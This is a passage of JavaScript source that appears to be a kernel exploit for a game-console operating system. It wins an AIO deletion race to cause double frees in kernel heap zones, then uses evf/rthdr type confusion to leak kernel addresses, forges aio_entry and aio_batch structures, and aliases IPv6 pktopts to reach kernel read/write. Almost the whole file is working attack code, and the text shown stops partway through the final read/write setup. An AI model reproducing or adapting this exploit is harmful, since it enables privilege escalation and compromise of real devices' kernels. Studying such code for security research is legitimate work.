//#region Variables
const NUM_REQS = 3; // 0x80 kmalloc zone since SceKernelAioRWRequest.sizeof * 3 = 0x78
const NUM_WORKER = 2;
const NUM_SPRAY = 0x200;
const NUM_ATTEMPT = 0x80;
const NUM_HANDLES = 0x100;
const NUM_IPV6_SOCK = 0x80;
const NUM_SPRAY_SOCK = 0x20;
//#endregion
//#region Contants
const SCE_KERNEL_ERROR_ESRCH = 0x80020003;

const AIO_OP_CANCEL = 1;
const AIO_OP_WAIT = 2;
const AIO_OP_POLL = 4;
const AIO_OP_DELETE = 8;

const AIO_MAX_NUM = 0x80;
const AIO_WAIT_AND = 1;
const AIO_CMD_READ = 1;
const AIO_CMD_WRITE = 2;
const AIO_CMD_MULTI = 0x1000;
const AIO_PRIORITY_HIGH = 3;
const AIO_STATE_COMPLETE = 3;
const AIO_STATE_ABORTED = 4;

const block_ss = new Array(2);
const rthdr_twins = new Array(2);
const pktopts_twins = new Array(2);
const ipv6_socks = new Array(NUM_IPV6_SOCK);
const spray_socks = new Array(NUM_SPRAY_SOCK);
const spray_ids = new Uint32Array(NUM_SPRAY);
const block_ids = new Uint32Array(NUM_WORKER);
const outs = new Uint32Array(AIO_MAX_NUM);

let race_worker = undefined;

let evf = undefined;
let reqs1 = undefined;
let reqs1_addr = undefined;
let evf_cv_addr = undefined;
let aio_info_addr = undefined;
let target_id = undefined;

fn.accept = new NativeFunction(0x1e, 'number');
fn.getsockname = new NativeFunction(0x20, 'number');
fn.connect = new NativeFunction(0x62, 'number');
fn.bind = new NativeFunction(0x68, 'number');
fn.listen = new NativeFunction(0x6a, 'number');
fn.evf_create = new NativeFunction(0x21a, 'number');
fn.evf_delete = new NativeFunction(0x21b, 'number');
fn.evf_set = new NativeFunction(0x220, 'number');
fn.evf_clear = new NativeFunction(0x221, 'number');
fn.aio_multi_delete = new NativeFunction(0x296, 'number');
fn.aio_multi_wait = new NativeFunction(0x297, 'number');
fn.aio_multi_poll = new NativeFunction(0x298, 'number');
fn.aio_multi_cancel = new NativeFunction(0x29a, 'number');
fn.aio_submit_cmd = new NativeFunction(0x29d, 'number');
//#endregion
//#region Functions
function build_reqs1(count, fd = -1) {
  mem.bset(reqs1.addr, SceKernelAioRWRequest.sizeof * AIO_MAX_NUM);
  for (let i = 0; i < count; i++) {
    reqs1[i].nbyte = fd === -1 ? 0 : 1;
    reqs1[i].fd = fd;
  }
}

function spray_aio(cmd, num_reqs, ids, count = ids.length) {
  const step = cmd & AIO_CMD_MULTI ? num_reqs : 1;
  count = cmd & AIO_CMD_MULTI ? count / step : count;

  const ids_addr = ids.buffer.data();
  const total = count * step;

  for (let i = 0; i < total; i += step) {
    const ids_offset_addr = ids_addr.add(i * Uint32Array.BYTES_PER_ELEMENT);

    fn.aio_submit_cmd.invoke(cmd, reqs1.addr, num_reqs, AIO_PRIORITY_HIGH, ids_offset_addr);
  }
}

function process_aio(op, ids, offset = 0, count = ids.length - offset) {
  const ids_addr = ids.buffer.data();
  const outs_addr = outs.buffer.data();

  while (count > 0) {
    const step = Math.min(count, AIO_MAX_NUM);

    const ids_offset_addr = ids_addr.add(offset * Uint32Array.BYTES_PER_ELEMENT);

    if (op & AIO_OP_CANCEL) {
      fn.aio_multi_cancel.invoke(ids_offset_addr, step, outs_addr);
    }

    if (op & AIO_OP_WAIT) {
      fn.aio_multi_wait.invoke(ids_offset_addr, step, outs_addr, AIO_WAIT_AND, 0);
    }

    if (op & AIO_OP_POLL) {
      fn.aio_multi_poll.invoke(ids_offset_addr, step, outs_addr);
    }

    if (op & AIO_OP_DELETE) {
      fn.aio_multi_delete.invoke(ids_offset_addr, step, outs_addr);
    }

    count -= step;
    offset += step;
  }
}

async function spawn_race_worker(aio_ids_addr, outs_addr) {
  logger.debug('spawn race worker...');

  await load_script('src/thread.js');

  // Prepare worker
  race_worker = new Thread('race_worker');
  await race_worker.init();
  await race_worker.execute(
    'register',
    'kinit',
    `() => {
      importScripts('kernel.js');

      pin_to_core(MAIN_CORE);
      set_rtprio(RTP);

      fn.aio_multi_delete = new NativeFunction(0x296, 'number');

      self.ids_addr = new BInt('${aio_ids_addr}');
      self.outs_addr = new BInt('${outs_addr}');

      return true;
    }`,
  );
  await race_worker.execute(
    'register',
    'aio_delete',
    `() => {
      fn.aio_multi_delete.invoke(self.ids_addr, 1, self.outs_addr);
      
      return true;
    }`,
  );

  await race_worker.execute('kinit');

  logger.debug('race worker spawned !!');
}

function stop_race_worker() {
  if (race_worker !== undefined) {
    logger.debug('terminate race worker...');

    race_worker.terminate();
    race_worker = undefined;

    logger.debug('race worker terminated !!');
  }
}

function verify_reqs2(aio_entry) {
  // heap addresses are prefixed with 0xffff_xxxx
  // xxxx is randomized on boot
  //
  // heap_prefixes is a array of randomized prefix bits from a group of heap
  // address candidates. if the candidates truly are from the heap, they must
  // share a common prefix
  const heap_prefixes = [];
  const verify_prefix = (v) => {
    const word3 = v.shr(0x30).and(0xffff);
    if (word3.neq(0xffff)) {
      throw new Error(`${v} not a kernel pointer !!`);
    }

    const word2 = v.shr(0x20).and(0xffff);
    if (word2.neq(0xffff)) {
      heap_prefixes.push(word2);
    }
  };

  try {
    if (aio_entry.ar2_cmd !== AIO_CMD_WRITE) {
      return false;
    }

    verify_prefix(aio_entry.ar2_reqs1);
    verify_prefix(aio_entry.ar2_info);
    verify_prefix(aio_entry.ar2_batch);

    // check reqs2.ar2_result.state
    // state is actually a 32-bit value but the allocated memory was
    // initialized with zeros. all padding bytes must be 0 then
    if (aio_entry.ar2_result.state <= 0 || aio_entry.ar2_result.state > AIO_STATE_ABORTED) {
      return false;
    }

    if (aio_entry.ar2_result._pad !== 0) {
      return false;
    }

    // reqs2.ar2_file must be NULL since we passed a bad file descriptor to
    // aio_submit_cmd()
    if (aio_entry.ar2_file.neq(0)) {
      return false;
    }

    // aio_entry._unk2 can be NULL
    if (aio_entry._unk2.neq(0)) {
      verify_prefix(aio_entry._unk2);
    }

    verify_prefix(aio_entry.ar2_qentry);

    return heap_prefixes.every((v, _, a) => v.eq(a[0]));
  } catch (e) {
    return false;
  }
}

function find_rthdr_twins() {
  for (let i = 0; i < NUM_ATTEMPT; i++) {
    for (let j = 0; j < ipv6_socks.length; j++) {
      const marker = (j << 0x10) | 0x1337;

      arw.view(spray_rthdr0_addr).setInt32(4, marker, true); // ip6_rthdr0.ip6r0_reserved

      set_rthdr(ipv6_socks[j]);
    }

    for (let j = 0; j < ipv6_socks.length; j++) {
      get_rthdr(ipv6_socks[j], ip6_rthdr0.sizeof);

      const marker = arw.view(leak_rthdr0_addr).getInt32(4, true); // ip6_rthdr0.ip6r0_reserved
      const tag = marker & 0xffff;
      const idx = marker >>> 0x10;
      if (tag === 0x1337 && idx in ipv6_socks && idx !== j) {
        logger.debug(`Found rthdr twins after ${i} iterations !!`);

        rthdr_twins[0] = ipv6_socks[j];
        rthdr_twins[1] = ipv6_socks[idx];

        const max = Math.max(j, idx);
        const min = Math.min(j, idx);

        // remove twins from list
        ipv6_socks.splice(max, 1);
        ipv6_socks.splice(min, 1);

        // free rthdr from rest of sockets
        for (const sock of ipv6_socks) {
          free_rthdr(sock);
        }

        // replace twins with new sockets
        ipv6_socks.push(make_socket(AF_INET6, SOCK_DGRAM), make_socket(AF_INET6, SOCK_DGRAM));

        return;
      }
    }
  }

  throw new Error('Unable to find rthdr twins !!');
}

function make_pktopts_twins() {
  const tclass_addr = mem.alloc(4);
  const tclass_len_addr = mem.alloc(4);

  let overwritten = false;
  for (let i = 0; i < NUM_ATTEMPT; i++) {
    for (let j = 0; j < ipv6_socks.length; j++) {
      if (fn.setsockopt.invoke(ipv6_socks[j], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0) === -1) {
        throw new SyscallError(`Unable to set socket option for fd ${ipv6_socks[j]} !!`);
      }
    }

    for (let j = 0; j < ipv6_socks.length; j++) {
      arw.view(tclass_addr).setInt32(0, j, true);

      if (fn.setsockopt.invoke(ipv6_socks[j], IPPROTO_IPV6, IPV6_TCLASS, tclass_addr, 4) === -1) {
        throw new SyscallError(`Unable to set socket option for fd ${ipv6_socks[j]} !!`);
      }
    }

    for (let j = 0; j < ipv6_socks.length; j++) {
      arw.view(tclass_len_addr).setInt32(0, 4, true);

      if (fn.getsockopt.invoke(ipv6_socks[j], IPPROTO_IPV6, IPV6_TCLASS, tclass_addr, tclass_len_addr) === -1) {
        throw new SyscallError(`Unable to get socket option for fd ${ipv6_socks[j]} !!`);
      }

      const idx = arw.view(tclass_addr).getInt32(0, true);
      if (idx in ipv6_socks && idx !== j) {
        pktopts_twins[0] = ipv6_socks[j];
        pktopts_twins[1] = ipv6_socks[idx];

        const max = Math.max(j, idx);
        const min = Math.min(j, idx);

        // remove twins from list
        ipv6_socks.splice(max, 1);
        ipv6_socks.splice(min, 1);

        // replace twins with new sockets, and add pktopts now while new allocs can't
        // use the double freed memory
        for (let k = 0; k < pktopts_twins.length; k++) {
          const sock = make_socket(AF_INET6, SOCK_DGRAM);

          if (fn.setsockopt.invoke(sock, IPPROTO_IPV6, IPV6_TCLASS, tclass_addr, 4) === -1) {
            throw new SyscallError(`Unable to set socket option for fd ${sock} !!`);
          }

          ipv6_socks.push(sock);
        }

        overwritten = true;

        logger.debug(`Found pktopts twins after ${i} iterations !!`);

        break;
      }
    }

    if (overwritten) break;
  }

  mem.free(tclass_addr);
  mem.free(tclass_len_addr);

  if (!overwritten) {
    throw new Error('Unable to make pktopts twins !!');
  }
}

function init() {
  logger.info('Environment init started...');

  pin_to_core(MAIN_CORE);
  set_rtprio(RTP);

  // Prepare spray/leak rthdr0
  spray_rthdr0_addr = mem.alloc(0x100);
  spray_rthdr0_len = build_rthdr(spray_rthdr0_addr, 0x80);

  leak_rthdr0_addr = mem.alloc(0x800);

  // Prepare reqs
  const aio_rw_req_buf = mem.alloc(SceKernelAioRWRequest.sizeof * AIO_MAX_NUM);
  reqs1 = SceKernelAioRWRequest.new(aio_rw_req_buf);

  make_karw_pipe();

  [block_ss[0], block_ss[1]] = make_socketpair(AF_UNIX, SOCK_STREAM);

  logger.debug(`block_ss: ${block_ss}`);

  // Setup sockets for spraying and initialize pktopts
  for (let i = 0; i < ipv6_socks.length; i++) {
    ipv6_socks[i] = make_socket(AF_INET6, SOCK_DGRAM);
  }

  // Setup sockets for overwriting AIO entry
  for (let i = 0; i < spray_socks.length; i++) {
    spray_socks[i] = make_socket(AF_INET6, SOCK_DGRAM);
  }

  logger.info('Environment init completed !!');
}

function cleanup() {
  logger.info('Environment cleanup started...');

  for (const fd of block_ss) {
    if (!Number.isFinite(fd) || fd === 0) {
      continue;
    }

    if (fn.close.invoke(fd) === -1) {
      throw new SyscallError(`Unable to close fd ${fd} !!`);
    }
  }

  if (spray_ids.some((v) => v !== 0)) {
    process_aio(AIO_OP_POLL | AIO_OP_DELETE, spray_ids);
    spray_ids.fill(0);
  }

  if (block_ids.some((v) => v !== 0)) {
    process_aio(AIO_OP_WAIT | AIO_OP_DELETE, block_ids);
  }

  for (const fd of ipv6_socks) {
    if (!Number.isFinite(fd) || fd === 0) {
      continue;
    }

    if (fn.close.invoke(fd) === -1) {
      throw new SyscallError(`Unable to close fd ${fd} !!`);
    }
  }

  for (const fd of spray_socks) {
    if (!Number.isFinite(fd) || fd === 0) {
      continue;
    }

    if (fn.close.invoke(fd) === -1) {
      throw new SyscallError(`Unable to close fd ${fd} !!`);
    }
  }

  for (const fd of pktopts_twins) {
    if (!Number.isFinite(fd) || fd === 0) {
      continue;
    }

    if (fn.close.invoke(fd) === -1) {
      throw new SyscallError(`Unable to close fd ${fd} !!`);
    }
  }

  for (const fd of rthdr_twins) {
    if (!Number.isFinite(fd) || fd === 0) {
      continue;
    }

    if (fn.close.invoke(fd) === -1) {
      throw new SyscallError(`Unable to close fd ${fd} !!`);
    }
  }

  free_karw_pipe();

  stop_race_worker();

  if (reqs1 !== undefined) {
    mem.free(reqs1.addr);
  }

  mem.free(spray_rthdr0_addr);
  mem.free(leak_rthdr0_addr);

  logger.info('Environment cleanup completed !!');
}

function setup() {
  logger.info('Environment setup started...');

  logger.info('Block AIO...');

  build_reqs1(NUM_WORKER, block_ss[0]);

  spray_aio(AIO_CMD_READ | AIO_CMD_MULTI, NUM_WORKER, block_ids);
  logger.debug(`block_ids: ${block_ids.hex()}`);

  logger.info('Spray AIO...');

  build_reqs1(NUM_REQS);

  spray_aio(AIO_CMD_READ, NUM_REQS, spray_ids);

  process_aio(AIO_OP_CANCEL, spray_ids);

  logger.info('Environment setup completed !!');
}

async function double_free_reqs2() {
  const which_req = NUM_REQS - 1;
  const aio_ids = new Uint32Array(NUM_REQS);

  build_reqs1(NUM_REQS);

  const aio_ids_offset_addr = aio_ids.buffer.data().add(which_req * Uint32Array.BYTES_PER_ELEMENT);
  const outs_offset_addr = outs.buffer.data().add(1 * Uint32Array.BYTES_PER_ELEMENT);

  await spawn_race_worker(aio_ids_offset_addr, outs_offset_addr);

  const server_addr = sockaddr_in.new();
  server_addr.sin_family = AF_INET;
  server_addr.sin_port = 0x8d13; // 5005
  server_addr.sin_addr = 0x0100007f; // 127.0.0.1

  const server_sock = make_socket(AF_INET, SOCK_STREAM);
  logger.debug(`server_sock: ${server_sock}`);

  const optval_addr = mem.alloc(4);
  arw.view(optval_addr).setInt32(0, 1, true);

  if (fn.setsockopt.invoke(server_sock, SOL_SOCKET, SO_REUSEADDR, optval_addr, 4) === -1) {
    throw new SyscallError(`Unable to set socket option for fd ${sock} !!`);
  }

  mem.free(optval_addr);

  if (fn.bind.invoke(server_sock, server_addr.addr, sockaddr_in.sizeof) === -1) {
    throw new SyscallError(`Unable to bind socket ${server_sock} !!`);
  }

  if (fn.listen.invoke(server_sock, 1) === -1) {
    throw new SyscallError(`Unable to listen socket ${server_sock} !!`);
  }

  const client_linger = linger.new();
  client_linger.l_onoff = 1;
  client_linger.l_linger = 1;

  let won_race = false;
  for (let i = 0; i < NUM_ATTEMPT; i++) {
    logger.debug('Attempt AIO double free race...');

    const client_sock = make_socket(AF_INET, SOCK_STREAM);
    logger.debug(`client_sock: ${client_sock}`);

    if (fn.connect.invoke(client_sock, server_addr.addr, sockaddr_in.sizeof) === -1) {
      throw new SyscallError(`Unable to connect socket ${client_sock} !!`);
    }

    const connected_sock = fn.accept.invoke(server_sock, 0, 0);
    logger.debug(`connected_sock: ${connected_sock}`);
    if (connected_sock === -1) {
      throw new SyscallError(`Unable to accept socket ${server_sock} !!`);
    }

    // force soclose() to sleep
    if (fn.setsockopt.invoke(client_sock, SOL_SOCKET, SO_LINGER, client_linger.addr, linger.sizeof) === -1) {
      throw new SyscallError(`Unable to set socket option for fd ${client_sock} !!`);
    }

    reqs1[which_req].fd = client_sock;

    spray_aio(AIO_CMD_READ | AIO_CMD_MULTI, NUM_REQS, aio_ids);
    process_aio(AIO_OP_CANCEL | AIO_OP_POLL, aio_ids);

    logger.debug(`aio_ids: ${aio_ids.hex()}`);

    // drop the reference so that aio_multi_delete() will trigger _fdrop()
    if (fn.close.invoke(client_sock) === -1) {
      throw new SyscallError(`Unable to close fd ${client_sock} !!`);
    }

    const race_task = race_worker.execute('aio_delete');

    if (fn.sched_yield.invoke() === -1) {
      throw new SyscallError('Unable to yield scheduler !!');
    }

    process_aio(AIO_OP_POLL, aio_ids, which_req);

    logger.debug(`poll_err: ${outs[0].hex()}`);

    const info_addr = mem.alloc(TCP_INFO_SIZE);

    const info_size_addr = mem.alloc(4);
    arw.view(info_size_addr).setInt32(0, TCP_INFO_SIZE, true);

    if (fn.getsockopt.invoke(connected_sock, IPPROTO_TCP, TCP_INFO, info_addr, info_size_addr) === -1) {
      throw new SyscallError(`Unable to get socket option for fd ${connected_sock} !!`);
    }

    const tcp_state = arw.view(info_addr).getInt8(0);
    logger.debug(`tcp_state: ${tcp_state}`);

    mem.free(info_addr);
    mem.free(info_size_addr);

    if (outs[0] !== SCE_KERNEL_ERROR_ESRCH && tcp_state !== TCPS_ESTABLISHED) {
      // PANIC: double free on the 0x80 malloc zone. important kernel
      // data may alias
      process_aio(AIO_OP_DELETE, aio_ids, which_req);
      won_race = true;
    }

    await race_task;

    if (won_race) {
      let verify_won_race = false;

      const race_errs = outs.slice(0, 2);
      logger.debug(`race_errs: ${race_errs.hex()}`);

      // if the code has no bugs then this isn't possible but we keep the
      // check for easier debugging
      if (race_errs.every((v) => v === 0)) {
        logger.info('Looking for rthdr twins...');

        // RESTORE: double freed memory has been reclaimed with harmless data
        // PANIC: 0x80 malloc zone pointers aliased
        find_rthdr_twins();

        logger.info(`Found rthdr twins: ${rthdr_twins} !!`);

        logger.debug(`AIO double free achieved after ${i} iterations !!`);

        logger.info('AIO double free achieved !!');

        verify_won_race = true;
      }

      won_race = verify_won_race;
    }

    // MEMLEAK: if we won the race, aio_obj.ao_num_reqs got decremented
    // twice. this will leave one request undeleted
    process_aio(AIO_OP_DELETE, aio_ids);

    if (fn.close.invoke(connected_sock) === -1) {
      throw new SyscallError(`Unable to close fd ${connected_sock} !!`);
    }

    if (won_race) break;
  }

  stop_race_worker();

  if (fn.close.invoke(server_sock) === -1) {
    throw new SyscallError(`Unable to close fd ${server_sock} !!`);
  }

  mem.free(server_addr.addr);
  mem.free(client_linger.addr);

  if (!won_race) {
    throw new Error('AIO double free failed !!');
  }
}

function leak_kaddrs() {
  logger.info('Leak evf started...');

  if (fn.close.invoke(rthdr_twins[1]) === -1) {
    throw new SyscallError(`Unable to close fd ${rthdr_twins[1]} !!`);
  }

  rthdr_twins[1] = 0;

  // type confuse a struct evf with a struct ip6_rthdr. the flags of the evf
  // must be set to >= 0xf00 in order to fully leak the contents of the rthdr
  let leaked = false;
  for (let i = 0; i < NUM_ATTEMPT; i++) {
    const evfs = new Array(NUM_HANDLES);

    for (let i = 0; i < evfs.length; i++) {
      const marker = (i << 0x10) | 0xf00;
      evfs[i] = fn.evf_create.invoke('', 0, marker);
    }

    get_rthdr(rthdr_twins[0], 0x80);

    const marker = arw.view(leak_rthdr0_addr).getInt32(0, true);
    const tag = marker & 0xffff;
    const idx = marker >>> 0x10;
    if (tag === 0xf00 && idx in evfs) {
      evf = evfs[idx];

      fn.evf_clear.invoke(evf, 0);
      fn.evf_set.invoke(evf, marker | 1);

      get_rthdr(rthdr_twins[0], 0x80);

      const new_marker = arw.view(leak_rthdr0_addr).getInt32(0, true);
      const new_tag = new_marker & 0xffff;
      const new_idx = new_marker >>> 0x10;
      if (new_tag === (tag | 1) && new_idx === idx) {
        logger.debug(`evf: ${evf.hex()}`);

        leaked = true;

        logger.debug(`Leaked evf after ${i} iterations !!`);

        evfs.splice(idx, 1);
      }
    }

    for (const evf of evfs) {
      fn.evf_delete.invoke(evf);
    }

    if (leaked) break;
  }

  if (!leaked) {
    throw new Error('Unable to leak evf !!');
  }

  logger.info('Leaked evf !!');

  // ip6_rthdr0 and evf obj are overlapped by now
  // corrupt ip6r0_len to leak (0xFF + 1) * 8 bytes [0x800] by setting the evf's flag
  fn.evf_clear.invoke(evf, 0);
  fn.evf_set.invoke(evf, 0xff << 8);

  hexdump(leak_rthdr0_addr, 0x80);

  // fields we use from evf:
  //   struct evf:
  //     0 u64 flags
  //     0x28 struct cv cv
  //     0x38 TAILQ_HEAD(struct evf_waiter) waiters
  //
  // evf.cv.cv_description = "evf cv"
  // string is located at the kernel's mapped ELF file
  evf_cv_addr = arw.view(leak_rthdr0_addr).getBInt(0x28, true);
  logger.debug(`evf_cv_addr: ${evf_cv_addr}`);

  // because of TAILQ_INIT(), we have:
  //
  // evf.waiters.tqh_last == &evf.waiters.tqh_first
  //
  // we now know the address of the kernel buffer we are leaking
  const kmalloc_addr = arw.view(leak_rthdr0_addr).getBInt(0x40, true).sub(0x38);
  logger.debug(`kmalloc_addr: ${kmalloc_addr}`);

  // allocate reqs1 arrays at 0x100 kmalloc zone
  const num_reqs = Math.floor(0x100 / SceKernelAioRWRequest.sizeof);
  const leak_ids = new Uint32Array(num_reqs * NUM_HANDLES);

  build_reqs1(num_reqs);

  // use reqs1 to fake a aio_info. set .ai_cred (offset 0x10) to offset 4 of
  // the reqs2 so crfree(ai_cred) will harmlessly decrement the .ar2_ticket
  // field
  reqs1.buf = kmalloc_addr.add(4);

  // use reqs1 to fake a aio_batch at offset 0x28.
  const spray_aio_batch = aio_batch.new(reqs1.addr.add(0x28));

  spray_aio_batch.ar3_num_reqs = 1;
  spray_aio_batch.ar3_reqs_left = 0;
  spray_aio_batch.ar3_state = AIO_STATE_COMPLETE;
  spray_aio_batch.ar3_done = 0;

  // .ar3_lock.lock_object.lo_flags = (
  //     LO_SLEEPABLE | LO_UPGRADABLE
  //     | LO_RECURSABLE | LO_DUPOK | LO_WITNESS
  //     | 6 << LO_CLASSSHIFT
  //     | LO_INITIALIZED
  // )
  spray_aio_batch.lock_object_flags = 0x67b0000;

  // .ar3_lock.lk_lock = LK_UNLOCKED
  spray_aio_batch.lock_object_lock = 1;

  logger.info('leak reqs2 started...');

  const leak_aio_entry = aio_entry.new(leak_rthdr0_addr);

  let reqs2;
  leaked = false;
  for (let i = 0; i < NUM_ATTEMPT; i++) {
    spray_aio(AIO_CMD_WRITE | AIO_CMD_MULTI, num_reqs, leak_ids);

    // out of bound read on adjacent malloc 0x80 memory
    get_rthdr(rthdr_twins[0], 0x800);

    for (let j = 1; j < 0x10; j++) {
      const aio_entry = leak_aio_entry[j];
      if (verify_reqs2(aio_entry)) {
        reqs2 = aio_entry;

        logger.debug(`Leaked reqs2 index: ${j}`);

        leaked = true;

        logger.debug(`Leaked reqs2 after ${i} iterations !!`);

        break;
      }
    }

    if (leaked) break;

    process_aio(AIO_OP_CANCEL | AIO_OP_POLL | AIO_OP_DELETE, leak_ids);
  }

  if (!leaked) {
    throw new Error('Unable to leak reqs2 !!');
  }

  logger.info('Leaked reqs2 !!');

  hexdump(reqs2.addr, 0x80);

  // reqs1 is allocated from malloc 0x100 zone, so it must be aligned at 0xff..xx00
  reqs1_addr = reqs2.ar2_reqs1.alignDown(0x100);
  logger.debug(`reqs1_addr: ${reqs1_addr}`);

  // store for curproc leak later
  aio_info_addr = reqs2.ar2_info;
  logger.debug(`aio_info_addr: ${aio_info_addr}`);

  logger.info('Find target_id started...');

  let rest = 0;
  let found = false;
  for (let batch = 0; batch < leak_ids.length; batch += num_reqs) {
    process_aio(AIO_OP_CANCEL, leak_ids, batch, num_reqs);

    // out of bound read on adjacent malloc 0x80 memory
    get_rthdr(rthdr_twins[0], 0x800);

    if (reqs2.ar2_result.state === AIO_STATE_ABORTED) {
      target_id = leak_ids[batch];
      logger.debug(`target_id: ${target_id.hex()}`);

      leak_ids[batch] = 0;

      found = true;

      logger.debug(`Found target_id at batch ${batch / num_reqs} !!`);

      rest = batch + num_reqs;
      break;
    }
  }

  process_aio(AIO_OP_CANCEL, leak_ids, rest);
  process_aio(AIO_OP_POLL | AIO_OP_DELETE, leak_ids);

  if (!found) {
    throw new Error('Unable to find target_id !!');
  }

  logger.info('Found target_id !!');

  hexdump(reqs2.addr, 0x80);
}

function double_free_reqs1() {
  const num_batches = 2;
  const aio_ids = new Uint32Array(num_batches * AIO_MAX_NUM);

  build_reqs1(AIO_MAX_NUM);

  logger.info('Leak AIO queue entry started...');

  fn.evf_delete.invoke(evf);

  let leaked = false;
  for (let i = 0; i < NUM_ATTEMPT; i++) {
    spray_aio(AIO_CMD_READ | AIO_CMD_MULTI, AIO_MAX_NUM, aio_ids);

    const len = get_rthdr(rthdr_twins[0], 0x800);
    const ar2_cmd = arw.view(leak_rthdr0_addr).getInt32(0, true);
    if (len === 8 && ar2_cmd === AIO_CMD_READ) {
      leaked = true;

      logger.debug(`Leaked AIO queue entry after ${i} iterations !!`);

      process_aio(AIO_OP_CANCEL, aio_ids);

      break;
    }

    process_aio(AIO_OP_CANCEL | AIO_OP_POLL | AIO_OP_DELETE, aio_ids);
  }

  if (!leaked) {
    throw new Error('Unable to leak AIO queue entry !!');
  }

  logger.info('Leaked AIO queue entry !!');

  logger.info('Craft AIO queue entry started...');

  // overlap crafted reqs3 (aio_batch) with reqs2 (aio_entry)
  const spray_aio_entry = aio_entry.new(spray_rthdr0_addr);

  spray_aio_entry.ar2_ticket = 5;
  spray_aio_entry.ar2_info = reqs1_addr;
  spray_aio_entry.ar2_batch = reqs1_addr.add(0x28); // fake aio_batch offset

  logger.info('Crafted AIO queue entry !!');

  logger.info('Spray crafted AIO queue entry started...');

  if (fn.close.invoke(rthdr_twins[0]) === -1) {
    throw new SyscallError(`Unable to close fd ${rthdr_twins[0]} !!`);
  }

  rthdr_twins[0] = 0;

  let req_id;
  let overwritten = false;
  for (let i = 0; i < NUM_ATTEMPT; i++) {
    for (const sock of spray_socks) {
      set_rthdr(sock);
    }

    for (let batch = 0; batch < aio_ids.length; batch += AIO_MAX_NUM) {
      outs.fill(-1);

      process_aio(AIO_OP_CANCEL, aio_ids, batch, AIO_MAX_NUM);

      const req_idx = outs.indexOf(AIO_STATE_COMPLETE);
      if (req_idx !== -1) {
        logger.debug(`req_idx: ${req_idx}`);

        logger.debug(`Found req_idx at batch ${batch / AIO_MAX_NUM} after ${i} iterations !!`);

        const aio_req_idx = batch + req_idx;

        req_id = aio_ids[aio_req_idx];
        logger.debug(`req_id: ${req_id.hex()}`);

        aio_ids[aio_req_idx] = 0;

        overwritten = true;

        logger.debug(`Overwritten crafted AIO queue entry after ${i} iterations !!`);

        break;
      }
    }

    if (overwritten) break;
  }

  if (!overwritten) {
    throw new Error('Unable to overwite crafted AIO queue entry !!');
  }

  logger.info('Overwritten crafted AIO queue entry !!');

  process_aio(AIO_OP_POLL | AIO_OP_DELETE, aio_ids);

  const target_ids = new Uint32Array([req_id, target_id]);

  // enable deletion of target_ids
  process_aio(AIO_OP_POLL, target_ids);

  const status = outs.slice(0, 2);
  logger.debug(`target status: ${status.hex()}`);

  // double free on malloc 0x100 by:
  //   - freeing target_id's aio_object->reqs1
  //   - freeing req_id's aio_object->aio_entries[x]->ar2_info
  //   - ar2_info points to same addr as target_id's aio_object->reqs1
  //
  // PANIC: double free on the 0x100 malloc zone. important kernel data may alias
  process_aio(AIO_OP_DELETE, target_ids);

  // we reclaim first since the sanity checking here is longer which makes it
  // more likely that we have another process claim the memory
  try {
    logger.info('Make pktopts twins...');

    // RESTORE: double freed memory has been reclaimed with harmless data
    // PANIC: 0x100 malloc zone pointers aliased
    make_pktopts_twins();

    logger.info(`Made pktopts twins: ${pktopts_twins} !!`);
  } finally {
    const errs = outs.slice(0, 2);

    logger.debug(`delete errors: ${errs.hex()}`);

    process_aio(AIO_OP_POLL, target_ids);

    const status = outs.slice(0, 2);

    logger.debug(`target status: ${status.hex()}`);

    if (status[0] !== SCE_KERNEL_ERROR_ESRCH) {
      throw new Error('Bad delete of corrupt AIO request');
    }

    if (errs.some((v) => v !== 0)) {
      throw new Error('Bad delete of ID pair');
    }
  }

  const leak_aio_entry = aio_entry.new(leak_rthdr0_addr);

  let found = false;
  for (let i = 0; i < spray_socks.length; i++) {
    get_rthdr(spray_socks[i], 0x80);

    if (leak_aio_entry.ar2_ticket === 4) {
      logger.info(`Found dirty rthdr: ${spray_socks[i]} !!`);

      rthdr_twins[0] = spray_socks[i];
      logger.debug(`dirty_fd: ${rthdr_twins[0]}`);

      found = true;

      // remove dirty from list
      spray_socks.splice(i, 1);

      // free rthdr from rest of sockets
      for (const sock of spray_socks) {
        free_rthdr(sock);
      }

      // replace dirty with new socket
      spray_socks.push(make_socket(AF_INET6, SOCK_DGRAM));

      break;
    }
  }

  if (!found) {
    throw new Error('Unable to find dirty rthdr !!');
  }
}

function make_karw() {
  logger.info('Initiate kernel ARW...');

  spray_rthdr0_len = build_rthdr(spray_rthdr0_addr, 0x100);

  const ip6po_pktinfo_addr = reqs1_addr.add(0x10);
  logger.debug(`ip6po_pktinfo_addr: ${ip6po_pktinfo_addr}`);

  arw.view(spray_rthdr0_addr).setBInt(0x10, ip6po_pktinfo_addr, true); // pktopts.ip6po_pktinfo = &pktopts.ip6po_pktinfo

  logger.info(`Overwrite ${pktopts_twins[0]} pktopts started...`);

  if (fn.close.invoke(pktopts_twins[1]) === -1) {
    throw new SyscallError(`Unable to close fd ${pktopts_twins[1]} !!`);
  }

  pktopts_twins[1] = 0;

  const tclass_addr = mem.alloc(4);
  const tclass_len_addr = mem.alloc(4);

  let overwritten = false;
  for (let i = 0; i < NUM_ATTEMPT; i++) {
    for (let i = 0; i < ipv6_socks.length; i++) {
      // if a socket doesn't have a pktopts, setting the rthdr will make
      // one. the new pktopts might reuse the memory instead of the
      // rthdr. make sure the sockets already have a pktopts before
      const marker = (i << 0x10) | 0x1337;
      arw.view(spray_rthdr0_addr).setUint32(k_ip6po_tclass, marker, true);
      set_rthdr(ipv6_socks[i]);
    }

    arw.view(tclass_len_addr).setInt32(0, 4, true);
    if (fn.getsockopt.invoke(pktopts_twins[0], IPPROTO_IPV6, IPV6_TCLASS, tclass_addr, tclass_len_addr) === -1) {
      throw new SyscallError(`Unable to get socket option for fd ${pktopts_twins[0]} !!`);
    }

    const marker = arw.view(tclass_addr).getUint32(0, true);
    const tag = marker & 0xffff;
    const idx = marker >>> 0x10;
    if (tag === 0x1337) {
      pktopts_twins[1] = ipv6_socks[idx];
      logger.debug(`reclaim_sock: ${pktopts_twins[1]}`);

      ipv6_socks.splice(idx, 1);

      overwritten = true;

      logger.debug(`Overwritten ${pktopts_twins[0]} pktopts after ${i} iterations !!`);

      break;
    }
  }

  mem.free(tclass_addr);
  mem.free(tclass_len_addr);

  if (!overwritten) {
    throw new Error(`Unable to overwite ${pktopts_twins[0]} pktopts !!`);
  }

  logger.info(`Overwritten ${pktopts_twins[0]} pktopts !!`);

  const pktinfo_addr = mem.alloc(0x14);
